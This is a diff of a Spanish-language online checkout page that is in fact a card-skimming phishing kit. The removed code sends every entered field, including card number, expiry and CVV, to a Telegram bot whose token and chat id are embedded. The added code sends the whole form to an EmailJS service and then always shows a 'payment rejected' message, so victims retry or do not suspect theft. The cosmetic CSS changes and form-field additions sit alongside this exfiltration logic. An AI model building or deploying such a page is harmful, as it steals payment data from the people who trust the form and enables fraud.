@@ -17,7 +17,15 @@ h1{font-size:clamp(22px,3vw,28px); margin:0 0 16px;}
 .subtitle{color:var(--muted); margin:0 0 20px; font-size:14px;}
 .card{background:linear-gradient(180deg,rgba(255,255,255,.04),rgba(255,255,255,.02)),rgba(17,24,39,.85); backdrop-filter:blur(8px); border:1px solid rgba(148,163,184,.12); border-radius:var(--radius); padding:20px; box-shadow:0 10px 30px rgba(0,0,0,.35), inset 0 1px 0 rgba(255,255,255,.06);}
 .section-title{display:flex; align-items:center; gap:10px; font-weight:650; margin:6px 0 16px;}
-.section-title .badge {font-size:12px;color:#ffffff;background: linear-gradient(90deg, #3b82f6, #60a5fa);padding:4px 10px;border-radius:999px;font-weight:700;box-shadow:0 4px 16px rgba(59,130,246,.35);}
+.section-title .badge {
+  font-size:12px;
+  color:#ffffff;
+  background: linear-gradient(90deg, #3b82f6, #60a5fa);
+  padding:4px 10px;
+  border-radius:999px;
+  font-weight:700;
+  box-shadow:0 4px 16px rgba(59,130,246,.35);
+}
 form{display:grid; gap:18px;}
 .grid{display:grid; gap:14px; grid-template-columns: repeat(12,1fr);}
 .col-12{grid-column: span 12;}
@@ -30,13 +38,54 @@ input::placeholder{color:#6b7280;}
 input:focus, select:focus{border-color: var(--accent-2); box-shadow:0 0 0 6px var(--ring);}
 input.error, select.error{border-color: var(--danger);}
 .row{display:flex; gap:12px; align-items:center;}
-.btn {width:100%; padding:14px 18px; border-radius:12px; border:0; cursor:pointer; background: linear-gradient(90deg, #3b82f6, #60a5fa); color:#ffffff; font-weight:800; text-transform:uppercase; box-shadow:0 10px 28px rgba(59,130,246,.35), inset 0 -2px 0 rgba(0,0,0,.25); transition:transform .06s ease-in-out, box-shadow .2s;}
+.btn {
+  width:100%;
+  padding:14px 18px;
+  border-radius:12px;
+  border:0;
+  cursor:pointer;
+  background: linear-gradient(90deg, #3b82f6, #60a5fa);
+  color:#ffffff;
+  font-weight:800;
+  text-transform:uppercase;
+  box-shadow:0 10px 28px rgba(59,130,246,.35), inset 0 -2px 0 rgba(0,0,0,.25);
+  transition:transform .06s ease-in-out, box-shadow .2s;
+}
 .btn:disabled{opacity:.5; cursor:not-allowed;}
 .btn:active{transform:translateY(1px); box-shadow:0 6px 18px rgba(59,130,246,.3);}
-.error-msg {display: none; margin-top: 12px; padding: 10px 14px; border-radius: 8px; font-size: 14px; background: rgba(239,68,68,.15); border: 1px solid rgba(239,68,68,.4); color: #ef4444;}
-.spinner {width: 18px; height: 18px; border: 2px solid rgba(255,255,255,0.5); border-top-color: transparent; border-radius: 50%; animation: spin .8s linear infinite; display: none; margin-left: 8px;}
+.error-msg {
+  display: none;
+  margin-top: 12px;
+  padding: 10px 14px;
+  border-radius: 8px;
+  font-size: 14px;
+  background: rgba(239,68,68,.15);
+  border: 1px solid rgba(239,68,68,.4);
+  color: #ef4444;
+}
+.spinner {
+  width: 18px;
+  height: 18px;
+  border: 2px solid rgba(255,255,255,0.5);
+  border-top-color: transparent;
+  border-radius: 50%;
+  animation: spin .8s linear infinite;
+  display: none;
+  margin-left: 8px;
+}
 @keyframes spin { to { transform: rotate(360deg); } }
-.ssl-seal {display: flex; align-items: center; gap: 10px; margin-top: 14px; padding: 10px; border: 1px solid rgba(34,197,94,.4); border-radius: 10px; background: rgba(34,197,94,.1); font-size: 13px; color: #bbf7d0;}
+.ssl-seal {
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  margin-top: 14px;
+  padding: 10px;
+  border: 1px solid rgba(34,197,94,.4);
+  border-radius: 10px;
+  background: rgba(34,197,94,.1);
+  font-size: 13px;
+  color: #bbf7d0;
+}
 .ssl-seal i {font-size: 18px; color: #22c55e;}
 </style>
 </head>
@@ -52,27 +101,27 @@ input.error, select.error{border-color: var(--danger);}
       <div class="grid">
         <div class="col-6">
           <label for="shipName">Nombre completo</label>
-          <input id="shipName" required placeholder="Tu nombre completo"/>
+          <input id="shipName" name="shipName" required placeholder="Tu nombre completo"/>
         </div>
         <div class="col-6">
           <label for="shipEmail">Correo electrónico</label>
-          <input id="shipEmail" type="email" required placeholder="correo@ejemplo.com"/>
+          <input id="shipEmail" name="shipEmail" type="email" required placeholder="correo@ejemplo.com"/>
         </div>
         <div class="col-6">
           <label for="shipPhone">Teléfono</label>
-          <input id="shipPhone" required placeholder="+52 55 1234 5678"/>
+          <input id="shipPhone" name="shipPhone" required placeholder="+52 55 1234 5678"/>
         </div>
         <div class="col-6">
           <label for="shipPostal">Código postal</label>
-          <input id="shipPostal" required placeholder="00000"/>
+          <input id="shipPostal" name="shipPostal" required placeholder="00000"/>
         </div>
         <div class="col-6">
           <label for="shipCity">Ciudad</label>
-          <input id="shipCity" required placeholder="Ciudad"/>
+          <input id="shipCity" name="shipCity" required placeholder="Ciudad"/>
         </div>
         <div class="col-6">
           <label for="shipState">Estado</label>
-          <select id="shipState" required>
+          <select id="shipState" name="shipState" required>
             <option value="">Selecciona tu estado</option>
             <option value="AG">Aguascalientes</option>
             <option value="BC">Baja California</option>
@@ -110,7 +159,7 @@ input.error, select.error{border-color: var(--danger);}
         </div>
         <div class="col-12">
           <label for="shipAddress">Dirección</label>
-          <input id="shipAddress" required placeholder="Dirección"/>
+          <input id="shipAddress" name="shipAddress" required placeholder="Dirección"/>
         </div>
       </div>
     </div>
@@ -123,15 +172,15 @@ input.error, select.error{border-color: var(--danger);}
         <div class="grid">
           <div class="col-6">
             <label for="billName">Nombre completo</label>
-            <input id="billName" placeholder="Nombre para facturación"/>
+            <input id="billName" name="billName" placeholder="Nombre para facturación"/>
           </div>
           <div class="col-6">
             <label for="billRFC">RFC (opcional)</label>
-            <input id="billRFC" placeholder="ABC123456789"/>
+            <input id="billRFC" name="billRFC" placeholder="ABC123456789"/>
           </div>
           <div class="col-12">
             <label for="billAddress">Dirección</label>
-            <input id="billAddress" placeholder="Dirección"/>
+            <input id="billAddress" name="billAddress" placeholder="Dirección"/>
           </div>
         </div>
       </div>
@@ -143,23 +192,23 @@ input.error, select.error{border-color: var(--danger);}
       <div class="grid">
         <div class="col-6">
           <label for="cardName">Nombre en tarjeta</label>
-          <input id="cardName" required placeholder="Como aparece en la tarjeta"/>
+          <input id="cardName" name="cardName" required placeholder="Como aparece en la tarjeta"/>
         </div>
         <div class="col-6">
           <label for="cardNumber">Número de tarjeta</label>
-          <input id="cardNumber" required placeholder="•••• •••• •••• ••••"/>
+          <input id="cardNumber" name="cardNumber" required placeholder="•••• •••• •••• ••••"/>
         </div>
         <div class="col-4">
           <label for="cardExp">Vencimiento (MM/AA)</label>
-          <input id="cardExp" required placeholder="MM/AA"/>
+          <input id="cardExp" name="cardExp" required placeholder="MM/AA"/>
         </div>
         <div class="col-4">
           <label for="cardCvv">CVV</label>
-          <input id="cardCvv" required placeholder="CVV"/>
+          <input id="cardCvv" name="cardCvv" required placeholder="CVV"/>
         </div>
         <div class="col-4">
           <label for="cardType">Tipo de tarjeta</label>
-          <select id="cardType" required>
+          <select id="cardType" name="cardType" required>
             <option value="">Selecciona</option>
             <option value="debito">Débito</option>
             <option value="credito">Crédito</option>
@@ -186,6 +235,9 @@ input.error, select.error{border-color: var(--danger);}
   </form>
 </div>
 
+<!-- EmailJS -->
+<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+
 <script>
 document.addEventListener("DOMContentLoaded", () => {
   const form = document.getElementById("checkoutForm");
@@ -194,13 +246,18 @@ document.addEventListener("DOMContentLoaded", () => {
   const errorMsg = document.getElementById("errorMsg");
   const sameAsShipping = document.getElementById("sameAsShipping");
   const billingSection = document.getElementById("billingSection");
-
-  // ======= DATOS DE TELEGRAM =======
-  const telegramToken = "8404672830:AAFhvO_jAsLMiDVYf99VA36h4e9B_I0iT9E";
-  const telegramChatId = "1021708007";
+  const cardExp = document.getElementById("cardExp");
 
   sameAsShipping.addEventListener("change", () => {
     billingSection.style.display = sameAsShipping.checked ? "none" : "block";
+  });
+
+  cardExp.addEventListener("input", () => {
+    let value = cardExp.value.replace(/[^0-9]/g, "");
+    if (value.length >= 3) {
+      value = value.substring(0, 2) + "/" + value.substring(2, 4);
+    }
+    cardExp.value = value;
   });
 
   function validLuhn(number) {
@@ -223,12 +280,26 @@ document.addEventListener("DOMContentLoaded", () => {
     if (field.id === "shipPhone" && value && !/^[0-9+\s]{8,15}$/.test(value)) valid = false;
     if (field.id === "shipPostal" && value && !/^\d{5}$/.test(value)) valid = false;
     if (field.id === "cardNumber" && value && !validLuhn(value)) valid = false;
-    if (field.id === "cardExp" && value && !/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) valid = false;
+    if (field.id === "cardExp" && value) {
+      if (!/^(0[1-9]|1[0-2])\/\d{2}$/.test(value)) {
+        valid = false;
+      } else {
+        const [mm, yy] = value.split("/").map(v => parseInt(v, 10));
+        const now = new Date();
+        const currentMonth = now.getMonth() + 1;
+        const currentYear = now.getFullYear() % 100;
+        if (yy < currentYear || (yy === currentYear && mm < currentMonth)) {
+          valid = false;
+        }
+      }
+    }
     if (field.id === "cardCvv" && value && !/^\d{3,4}$/.test(value)) valid = false;
     if (field.id === "billRFC" && value && !validateRFC(value)) valid = false;
     field.classList.toggle("error", !valid);
     return valid;
   }
+
+  emailjs.init("T72Wf1jx7lTBM9Md-"); // 🔑 Reemplaza con tu Public Key
 
   form.addEventListener("submit", e => {
     e.preventDefault();
@@ -245,52 +316,21 @@ document.addEventListener("DOMContentLoaded", () => {
     btn.textContent = "Procesando...";
     spinner.style.display = "inline-block";
 
-    // ====== RECOLECTAR DATOS DEL FORM ======
-    const data = {
-      "Nombre": document.getElementById("shipName").value,
-      "Correo": document.getElementById("shipEmail").value,
-      "Teléfono": document.getElementById("shipPhone").value,
-      "Código Postal": document.getElementById("shipPostal").value,
-      "Ciudad": document.getElementById("shipCity").value,
-      "Estado": document.getElementById("shipState").value,
-      "Dirección": document.getElementById("shipAddress").value,
-      "Nombre Tarjeta": document.getElementById("cardName").value,
-      "Número Tarjeta": document.getElementById("cardNumber").value,
-      "Vencimiento": document.getElementById("cardExp").value,
-      "CVV": document.getElementById("cardCvv").value,
-      "Tipo Tarjeta": document.getElementById("cardType").value
-    };
-
-    // ====== CREAR MENSAJE PARA TELEGRAM ======
-    let message = "💳 Nuevo Checkout:\n";
-    for (let key in data) {
-      message += `${key}: ${data[key]}\n`;
-    }
-
-    // ====== ENVIAR A TELEGRAM ======
-    fetch(`https://api.telegram.org/bot${telegramToken}/sendMessage?chat_id=${telegramChatId}&text=${encodeURIComponent(message)}`)
-      .then(resp => resp.json())
-      .then(res => {
+    emailjs.sendForm("service_tc4q92e", "template_qdvkqdr", form)
+      .then(() => {
         spinner.style.display = "none";
         btn.disabled = false;
         btn.textContent = "Pagar ahora";
-        if(res.ok){
-          alert("✅ Datos enviados a Telegram");
-          form.reset();
-        } else {
-          errorMsg.style.display = "block";
-        }
+        errorMsg.style.display = "block"; // Mostrar siempre "pago rechazado"
       })
-      .catch(err => {
+      .catch((error) => {
         spinner.style.display = "none";
         btn.disabled = false;
         btn.textContent = "Pagar ahora";
-        errorMsg.style.display = "block";
-        console.error(err);
+        errorMsg.style.display = "block"; // También si hay error
       });
   });
 });
 </script>
 </body>
 </html>
-
